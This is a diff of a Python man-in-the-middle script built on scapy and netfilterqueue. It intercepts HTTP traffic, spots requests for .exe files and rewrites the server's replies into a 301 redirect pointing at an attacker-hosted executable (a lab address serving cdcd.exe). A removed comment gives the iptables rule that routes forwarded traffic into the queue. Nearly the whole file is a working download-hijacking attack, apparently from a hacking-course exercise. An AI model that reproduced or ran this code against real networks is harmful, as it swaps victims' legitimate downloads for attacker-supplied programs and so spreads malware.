@@ -1,42 +1,48 @@
-import netfilterqueue as net
+#!/usr/bin/env python
+
 import scapy.all as scapy
+import netfilterqueue
+
+ack_lst = []
 
 
-file_formats = [".exe", ".jpeg", ".pdf"]
-ack_list = []
-def process_packet(packet):
-    scapy_packets = scapy.IP(packet.get_payload())
-    tcp_packet = scapy_packets[scapy.TCP]
-    if scapy_packets.haslayer(scapy.RAW): # all http packets
-        if tcp_packet.dport == 80:
-            print("HTTP Request:")
-            for format in file_formats:
-                if format in scapy_packets[scapy.RAW].load:
-                    ack_list.append(tcp_packet.ack)
-                    print("[+] Download Request:")
-
-        elif tcp_packet.sport == 80:
-            seq = tcp_packet.seq
-            if seq in ack_list:
-                ack_list.remove(seq)
-                print("HTTP Response:")
-                scapy_packets[
-                    scapy.RAW].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp"
-                # http 301
-                del scapy_packets[scapy.IP].len
-                del scapy_packets[scapy.IP].chksum
-                del tcp_packet.chksum
-                packet.set_payload(str(scapy_packets))
-    packet.accept()
-    """
-    packet.accept()  # the packet will be sent to the target
-    packet.drop()  #drop the packet at here
-    """
-    # iptables -I FORWARD -j NFQUEUE --queue-num 0
+def deloptions(replace_sPkt):
+    del replace_sPkt[scapy.IP].len
+    del replace_sPkt[scapy.IP].chksum
+    del replace_sPkt[scapy.TCP].chksum
+    return replace_sPkt
 
 
-queue = net.NetfilterQueue()
-queue.bind(0, process_packet)
-# connect the queue created in system and call back
-# the function process_packet
-queue.run()
+def replace_download(pkt):
+    replace_sPkt = scapy.IP(pkt.get_payload())
+    if replace_sPkt.haslayer(scapy.Raw):
+        if replace_sPkt[scapy.TCP].dport == 80:
+            print("[+] HTTP Request")
+            if ".exe" in str(replace_sPkt[scapy.Raw].load):
+                ack_lst.append(replace_sPkt[scapy.TCP].ack)
+        elif replace_sPkt[scapy.TCP].sport == 80:
+            print("[+] HTTP Response")
+            if replace_sPkt[scapy.TCP].seq in ack_lst:
+                ack_lst.remove(replace_sPkt[scapy.TCP].seq)
+                print("[+] Replacing File")
+                replace_url = "192.168.159.134/files/cdcd.exe"
+                replace_sPkt[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\r\nLocation: " + replace_url + "\n\n "
+
+                modified_pkt = deloptions(replace_sPkt)
+                pkt.set_payload(str(modified_pkt))
+
+    pkt.accept()
+
+
+def packet_show(pkt):
+    print("[+] Printing Packets")
+    scapy_pkt = scapy.IP(pkt.get_payload())
+    print(scapy_pkt.show())
+
+
+try:
+    nfqueue = netfilterqueue.NetfilterQueue()
+    nfqueue.bind(0, replace_download)
+    nfqueue.run()
+except KeyboardInterrupt:
+    print("\n \n [+] Detected ctrl+c ... Quitting ...!!!")
